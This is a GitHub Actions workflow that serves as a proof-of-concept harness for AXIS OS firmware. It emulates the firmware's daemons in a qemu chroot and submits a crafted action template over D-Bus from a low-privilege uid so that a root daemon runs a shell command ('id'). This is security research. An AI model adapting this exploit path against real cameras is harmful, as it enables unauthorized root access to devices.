name: daemon-authz-poc
# Executed-proof harness (daemon layer): starts the extracted AXIS OS daemons under
# qemu-user inside a chroot and drives their control sockets from a DIFFERENT uid,
# proving/disproving caller-authorization behavior of the daemon itself.
# Verbatim outputs are the PoC artifacts.
on:
  workflow_dispatch:
    inputs:
      firmware_url:
        description: "Official ftp.axis.com .bin URL"
        required: true
      firmware_sha256:
        description: "Expected SHA256 of the .bin"
        required: true

jobs:
  poc:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Install tooling
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq qemu-user-static zstd python3-pip gcc-aarch64-linux-gnu libc6-dev-arm64-cross
          python3 -m pip install --quiet PySquashfsImage zstandard

      - name: Download and verify official firmware
        run: |
          cd /tmp
          curl -sS -o fw.bin "${{ github.event.inputs.firmware_url }}"
          echo "${{ github.event.inputs.firmware_sha256 }}  fw.bin" | sha256sum -c -

      - name: Unpack container + extract rootfs (real symlinks)
        run: |
          cd /tmp
          python3 - <<'EOF'
          import gzip, tarfile, os, sys
          magic = open('fw.bin','rb').read(4)
          if magic[:2] == b'\x1f\x8b':
              raw = gzip.open('fw.bin','rb').read()
          elif magic == b'\x28\xb5\x2f\xfd':
              import zstandard
              raw = zstandard.ZstdDecompressor().stream_reader(open('fw.bin','rb')).read()
          else:
              sys.exit('unknown container magic %r' % magic)
          open('fw.tar','wb').write(raw)
          tf = tarfile.open('fw.tar'); tf.extractall('pkg')
          from PySquashfsImage import SquashFsImage
          img = SquashFsImage(open('pkg/rootfs.img','rb'))
          def sanitize(n):
              for c in '\\/:*?"<>|': n = n.replace(c,'_')
              return n
          def walk(node, outdir):
              name = node.name
              if isinstance(name, bytes): name = name.decode('utf-8','replace')
              path = os.path.join(outdir, sanitize(name))
              if node.is_dir:
                  os.makedirs(path, exist_ok=True)
                  for ch in node.iterdir():
                      try: walk(ch, path)
                      except Exception as e: print('walk fail', path, e)
                  return
              if node.is_symlink:
                  t = node.readlink()
                  if isinstance(t, bytes): t = t.decode('utf-8','replace')
                  try:
                      if os.path.lexists(path): os.remove(path)
                      os.symlink(t, path)
                  except (OSError, ValueError):
                      open(path + '.symlink','w').write(t)
                  return
              try: data = img.read_file(node.inode)
              except Exception as e:
                  print('read fail', path, e); return
              if data is None: return
              open(path,'wb').write(data)
              try: os.chmod(path, node.mode & 0o777)
              except OSError: pass
          os.makedirs('rootfs', exist_ok=True)
          for ch in img.root.iterdir(): walk(ch, 'rootfs')
          print('rootfs extracted')
          EOF
          sudo mv /tmp/rootfs /opt/rootfs

      - name: Provision chroot runtime dirs + cross-compile client
        run: |
          # dangling-symlink runtime dirs -> real dirs (device has tmpfs there)
          for p in var/run var/tmp var/volatile tmp; do
            if [ -L "/opt/rootfs/$p" ]; then sudo rm -f "/opt/rootfs/$p"; fi
            sudo mkdir -p "/opt/rootfs/$p"
          done
          sudo mkdir -p /opt/rootfs/var/run/dbg-cgi /opt/rootfs/var/run/dbus /opt/rootfs/var/lib/dbus /opt/rootfs/run/dbus /opt/rootfs/etc/actionengine
          sudo chmod 1777 /opt/rootfs/tmp
          sudo mknod /opt/rootfs/dev/null c 1 3 2>/dev/null || true
          sudo chmod 666 /opt/rootfs/dev/null 2>/dev/null || true
          aarch64-linux-gnu-gcc -static -O2 -o /tmp/dbox_client targets/axis-os/poc-harness/dbox_client.c 2>/dev/null || \
            aarch64-linux-gnu-gcc -static -O2 -o /tmp/dbox_client dbox_client.c
          aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas targets/axis-os/poc-harness/runas.c 2>/dev/null || \
            aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas runas.c
          file /tmp/dbox_client /tmp/runas
          sudo cp /tmp/dbox_client /tmp/runas /opt/rootfs/tmp/
          sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/

      - name: Start dbox daemon (uid 503) and drive its control socket cross-uid
        run: |
          echo "=== START dbox (debugar.cgi -n) as root-in-chroot; it self-setuid()s to debugar(503) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/debugar.cgi -n > /tmp/dbox.log 2>&1 &
          sleep 6
          sudo ls -la /opt/rootfs/var/run/dbg-cgi/ || true
          echo "=== dbox process + socket facts ==="
          pgrep -af qemu-aarch64 | head -3 || true
          sudo cat /tmp/dbox.log | head -10 || true
          echo "=== CLIENT 1: uid/gid 150 (= www, the uid Apache uses) calls cmd=ps; daemon runs as 503 ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/dbox_client 150 150 "cmd=ps" 2>&1 | tee /tmp/client1.log
          echo "=== client1 exit: $? ==="
          echo "=== CLIENT 2 (control): uid/gid 65534 (nogroup) — kernel socket gate expected to reject (EACCES) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/dbox_client 65534 65534 "cmd=ps" 2>&1 | tee /tmp/client2.log
          echo "=== client2 exit: $? ==="
          echo "=== response files ==="
          sudo ls -la /opt/rootfs/tmp/dbox_out_* 2>/dev/null || true
          for f in /opt/rootfs/tmp/dbox_out_*; do echo "--- $f (head) ---"; sudo head -25 "$f" 2>/dev/null; done
          echo "=== END ==="

      - name: Attempt actionengined with system bus (known -107 risk; honest capture)
        continue-on-error: true
        run: |
          set +e
          echo "=== start dbus-daemon --system inside chroot ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/dbus-uuidgen --ensure 2>&1 | head -2
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/dbus-daemon --system --nofork --nopidfile --address=unix:path=/run/dbus/system_bus_socket > /tmp/dbus.log 2>&1 &
          sleep 5
          sudo ls -la /opt/rootfs/var/run/dbus/ || true
          echo "=== busctl (sanity: bus reachable) ==="
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager list 2>&1 | head -10
          echo "=== start actionengined ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/actionengined -ni actionengined.system -c /usr/share/actionengine/action_engine_system.conf > /tmp/ae.log 2>&1 &
          sleep 8
          echo "=== actionengined log (verbatim) ==="
          sudo cat /tmp/ae.log | head -20
          echo "=== actionengined alive? ==="
          pgrep -af actionengined | head -2 || echo "actionengined not running"
          echo "=== if alive: tree + introspect ActionEngine.System ==="
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager tree com.axis.Event.ActionEngine.System 2>&1 | head -15
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager introspect com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine 2>&1 | head -30
          echo "=== add-action-template file (validate_command carries the proof payload) ==="
          sudo tee /opt/rootfs/tmp/ae_poc.xml > /dev/null <<'XML'
          <action>
            <id>com.axis.action.poc.ae001</id>
            <action_type>one_shot</action_type>
            <parameters>
            </parameters>
            <commands>
              <validate_command>
                <exec_command>
                  <path>/bin/true</path>
                </exec_command>
              </validate_command>
              <start_command>
                <exec_command>
                  <path>/bin/sh</path>
                  <exec_argument>-c</exec_argument>
                  <exec_argument>id > /tmp/proof_ae 2>&1</exec_argument>
                </exec_command>
              </start_command>
            </commands>
          </action>
          XML
          sudo chmod 644 /opt/rootfs/tmp/ae_poc.xml
          echo "=== uid 150 calls AddFromFile through the dbus policy (setresuid inside chroot) ==="
          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionTemplate AddFromFile s "/tmp/ae_poc.xml" 2>&1 | head -10
          echo "=== addcall exit: $? ==="
          sleep 3
          echo "=== proof file (written by ROOT daemon if validate_command ran) ==="
          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created"
          echo "=== stored templates under /etc/actionengine ==="
          sudo find /opt/rootfs/etc/actionengine -name "*poc*" 2>/dev/null | head -5
          echo "=== END actionengined attempt ==="

      - name: Archive logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: daemon-poc-logs
          path: |
            /tmp/client1.log
            /tmp/client2.log
            /tmp/dbox.log
            /tmp/ae.log
            /tmp/dbus.log
          if-no-files-found: ignore
